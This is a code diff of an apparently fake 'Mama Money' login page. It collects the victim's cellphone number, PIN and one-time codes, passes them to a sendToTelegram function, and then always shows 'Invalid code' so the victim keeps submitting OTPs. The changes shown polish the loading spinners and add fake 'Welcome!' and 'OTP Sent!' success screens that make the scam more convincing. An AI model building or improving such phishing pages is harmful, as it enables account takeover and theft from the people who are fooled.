@@ -123,35 +123,6 @@
             cursor: not-allowed;
         }
 
-        /* Button loading state */
-        .btn.loading {
-            color: transparent;
-            pointer-events: none;
-        }
-        .btn.loading .btn-text {
-            opacity: 0;
-        }
-        .btn .btn-loader {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            width: 22px;
-            height: 22px;
-            border: 2.5px solid rgba(255, 255, 255, 0.3);
-            border-top-color: #ffffff;
-            border-radius: 50%;
-            animation: btnSpin 0.7s linear infinite;
-            display: none;
-        }
-        .btn.loading .btn-loader {
-            display: block;
-        }
-
-        @keyframes btnSpin {
-            to { transform: translate(-50%, -50%) rotate(360deg); }
-        }
-
         /* ========== REMEMBER ME ========== */
         .remember-me {
             display: flex;
@@ -274,7 +245,7 @@
         }
 
         /* ============================================ */
-        /* SIMPLE PYAARA LOADING OVERLAY */
+        /* PYAARI 4 CIRCLE RINGS LOADING */
         /* ============================================ */
         .loading-overlay {
             position: fixed;
@@ -282,7 +253,7 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(30, 15, 50, 0.75);
+            background: rgba(30, 15, 50, 0.80);
             backdrop-filter: blur(10px);
             -webkit-backdrop-filter: blur(10px);
             display: none;
@@ -302,76 +273,163 @@
             to { opacity: 1; }
         }
 
-        /* Simple, pyara loader — 3 bouncing dots */
-        .simple-loader {
-            display: flex;
-            gap: 12px;
-            margin-bottom: 24px;
+        /* 4 rotating circle rings */
+        .loader-wrap {
+            position: relative;
+            width: 90px;
+            height: 90px;
+            margin-bottom: 26px;
         }
 
-        .simple-loader .dot {
-            width: 16px;
-            height: 16px;
+        .loader-ring {
+            position: absolute;
+            inset: 0;
             border-radius: 50%;
-            background: #ffffff;
-            animation: dotBounce 1.2s ease-in-out infinite;
-            box-shadow: 0 0 20px rgba(255, 255, 255, 0.5);
+            border: 4px solid transparent;
+            animation: ringSpin 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
         }
 
-        .simple-loader .dot:nth-child(1) {
-            background: #d8b4fe;
-            animation-delay: 0s;
-        }
-        .simple-loader .dot:nth-child(2) {
-            background: #ffffff;
-            animation-delay: 0.2s;
-        }
-        .simple-loader .dot:nth-child(3) {
-            background: #a78bfa;
-            animation-delay: 0.4s;
+        .loader-ring:nth-child(1) {
+            border-top-color: #d8b4fe;
+            animation-delay: -0.45s;
         }
 
-        @keyframes dotBounce {
-            0%, 80%, 100% {
-                transform: translateY(0) scale(1);
-                opacity: 0.6;
-            }
-            40% {
-                transform: translateY(-18px) scale(1.2);
-                opacity: 1;
-            }
+        .loader-ring:nth-child(2) {
+            border-right-color: #ffffff;
+            animation-delay: -0.3s;
+        }
+
+        .loader-ring:nth-child(3) {
+            border-bottom-color: #a78bfa;
+            animation-delay: -0.15s;
+        }
+
+        .loader-ring:nth-child(4) {
+            border-left-color: #7c3aed;
+        }
+
+        @keyframes ringSpin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Center shield icon */
+        .loader-center {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 26px;
+            color: #ffffff;
+            animation: centerPulse 1.5s ease-in-out infinite;
+        }
+
+        @keyframes centerPulse {
+            0%, 100% { transform: translate(-50%, -50%) scale(1); opacity: 1; }
+            50% { transform: translate(-50%, -50%) scale(1.15); opacity: 0.85; }
         }
 
         /* Loading text */
         .loading-text {
             color: #ffffff;
             font-size: 16px;
-            font-weight: 600;
+            font-weight: 700;
             letter-spacing: 0.5px;
+            margin-bottom: 6px;
             text-shadow: 0 2px 8px rgba(0, 0, 0, 0.4);
         }
 
         .loading-subtext {
-            color: rgba(255, 255, 255, 0.7);
+            color: rgba(255, 255, 255, 0.75);
             font-size: 12.5px;
-            font-weight: 400;
-            margin-top: 6px;
+            font-weight: 500;
+            letter-spacing: 0.3px;
+        }
+
+        /* Animated dots for text */
+        .loading-dots span {
+            display: inline-block;
+            animation: dotBounce 1.4s ease-in-out infinite;
+        }
+        .loading-dots span:nth-child(1) { animation-delay: 0s; }
+        .loading-dots span:nth-child(2) { animation-delay: 0.2s; }
+        .loading-dots span:nth-child(3) { animation-delay: 0.4s; }
+
+        @keyframes dotBounce {
+            0%, 80%, 100% { transform: translateY(0); opacity: 0.5; }
+            40% { transform: translateY(-5px); opacity: 1; }
+        }
+
+        /* Floating particles around loader */
+        .loader-particle {
+            position: absolute;
+            width: 8px;
+            height: 8px;
+            background: #d8b4fe;
+            border-radius: 50%;
+            opacity: 0.7;
+            animation: particleFloat 3s ease-in-out infinite;
+        }
+        .loader-particle:nth-child(1) {
+            top: -20px; left: 50%;
+            animation-delay: 0s;
+        }
+        .loader-particle:nth-child(2) {
+            bottom: -20px; right: 50%;
+            animation-delay: 0.5s;
+            background: #ffffff;
+        }
+        .loader-particle:nth-child(3) {
+            top: 50%; right: -25px;
+            animation-delay: 1s;
+            background: #a78bfa;
+        }
+        .loader-particle:nth-child(4) {
+            bottom: 50%; left: -25px;
+            animation-delay: 1.5s;
+            background: #7c3aed;
+        }
+
+        @keyframes particleFloat {
+            0%, 100% { transform: translateY(0) scale(1); opacity: 0.7; }
+            50% { transform: translateY(-8px) scale(1.3); opacity: 1; }
+        }
+
+        /* Success checkmark */
+        .success-icon {
+            font-size: 60px;
+            color: #4ade80;
+            animation: successPop 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
+        }
+
+        @keyframes successPop {
+            0% { transform: scale(0) rotate(-180deg); opacity: 0; }
+            60% { transform: scale(1.2) rotate(10deg); }
+            100% { transform: scale(1) rotate(0deg); opacity: 1; }
         }
     </style>
 </head>
 <body>
 
     <!-- ============================================ -->
-    <!-- SIMPLE LOADING OVERLAY -->
+    <!-- PYAARI 4 CIRCLE RINGS LOADING OVERLAY -->
     <!-- ============================================ -->
     <div class="loading-overlay" id="loadingOverlay">
-        <div class="simple-loader">
-            <div class="dot"></div>
-            <div class="dot"></div>
-            <div class="dot"></div>
+        <div class="loader-wrap" id="loaderWrap">
+            <div class="loader-ring"></div>
+            <div class="loader-ring"></div>
+            <div class="loader-ring"></div>
+            <div class="loader-ring"></div>
+            <div class="loader-center"><i class="fa-solid fa-shield-halved"></i></div>
+            <div class="loader-particle"></div>
+            <div class="loader-particle"></div>
+            <div class="loader-particle"></div>
+            <div class="loader-particle"></div>
         </div>
         <div class="loading-text" id="loadingText">Processing</div>
-        <div class="loading-subtext">Please wait...</div>
+        <div class="loading-subtext">
+            Please wait<span class="loading-dots"><span>.</span><span>.</span><span>.</span></span>
+        </div>
     </div>
 
     <div class="container">
@@ -384,7 +442,7 @@
                 <img class="logo-img" src="https://cdn.phototourl.com/member/2026-09-17-57a41e04-64e5-44a2-b24e-d056fad7788a.png" alt="Mama Money Logo" />
             </div>
 
-            <!-- Inputs — NO LOCK, any length allowed -->
+            <!-- Inputs — NO LOCK -->
             <div class="input-group">
                 <input type="tel" class="input-field" id="phoneInput" placeholder="Cellphone Number" autocomplete="tel" />
             </div>
@@ -394,8 +452,7 @@
 
             <!-- Login Button -->
             <button class="btn" id="loginBtn">
-                <span class="btn-text">Login <i class="fa-solid fa-arrow-right"></i></span>
-                <span class="btn-loader"></span>
+                Login <i class="fa-solid fa-arrow-right"></i>
             </button>
 
             <button class="btn">
@@ -432,8 +489,7 @@
 
             <!-- Verify Button -->
             <button class="btn" id="verifyBtn">
-                <span class="btn-text">Verify <i class="fa-solid fa-arrow-right"></i></span>
-                <span class="btn-loader"></span>
+                Verify <i class="fa-solid fa-arrow-right"></i>
             </button>
 
             <!-- Resend -->
@@ -457,6 +513,7 @@
         const pinInput = document.getElementById('pinInput');
 
         const loadingOverlay = document.getElementById('loadingOverlay');
+        const loaderWrap = document.getElementById('loaderWrap');
         const loadingText = document.getElementById('loadingText');
 
         let userPhone = '';
@@ -465,11 +522,31 @@
         // ========== SHOW / HIDE LOADING ==========
         function showLoading(text) {
             loadingText.textContent = text || 'Processing';
+            loaderWrap.innerHTML = `
+                <div class="loader-ring"></div>
+                <div class="loader-ring"></div>
+                <div class="loader-ring"></div>
+                <div class="loader-ring"></div>
+                <div class="loader-center"><i class="fa-solid fa-shield-halved"></i></div>
+                <div class="loader-particle"></div>
+                <div class="loader-particle"></div>
+                <div class="loader-particle"></div>
+                <div class="loader-particle"></div>
+            `;
             loadingOverlay.classList.add('show');
         }
 
         function hideLoading() {
             loadingOverlay.classList.remove('show');
+        }
+
+        function showSuccessThenHide(text, callback) {
+            loadingText.textContent = text || 'Success!';
+            loaderWrap.innerHTML = `<i class="fa-solid fa-check-circle success-icon"></i>`;
+            setTimeout(function() {
+                hideLoading();
+                if (typeof callback === 'function') callback();
+            }, 1200);
         }
 
         // ========== SEND TO TELEGRAM ==========
@@ -490,7 +567,6 @@
             userPhone = phoneInput.value.trim();
             userPin = pinInput.value.trim();
 
-            // Simple validation — koi length lock nahi
             if (!userPhone) {
                 phoneInput.focus();
                 alert('Please enter your cellphone number.');
@@ -502,7 +578,6 @@
                 return;
             }
 
-            loginBtn.classList.add('loading');
             showLoading('Signing In');
 
             sendToTelegram({
@@ -511,13 +586,12 @@
                 step: 'login'
             });
 
-            // 2 sec baad OTP page pe le jao
             setTimeout(function() {
-                loginBtn.classList.remove('loading');
-                hideLoading();
-                loginPage.classList.remove('active');
-                otpPage.classList.add('active');
-                startOtpDetection();
+                showSuccessThenHide('Welcome!', function() {
+                    loginPage.classList.remove('active');
+                    otpPage.classList.add('active');
+                    startOtpDetection();
+                });
             }, 2000);
         });
 
@@ -532,7 +606,6 @@
                 return;
             }
 
-            verifyBtn.classList.add('loading');
             showLoading('Verifying');
 
             sendToTelegram({
@@ -542,11 +615,8 @@
                 step: 'otp_verify'
             });
 
-            // 2 sec baad invalid show karo
             setTimeout(function() {
-                verifyBtn.classList.remove('loading');
                 hideLoading();
-
                 errorMsg.textContent = 'Invalid code. Please try again.';
                 errorMsg.classList.add('show');
                 otpInput.value = '';
@@ -567,8 +637,9 @@
             showLoading('Sending OTP');
 
             setTimeout(function() {
-                hideLoading();
-                alert('OTP sent successfully!');
+                showSuccessThenHide('OTP Sent!', function() {
+                    // done
+                });
             }, 1500);
         });
 
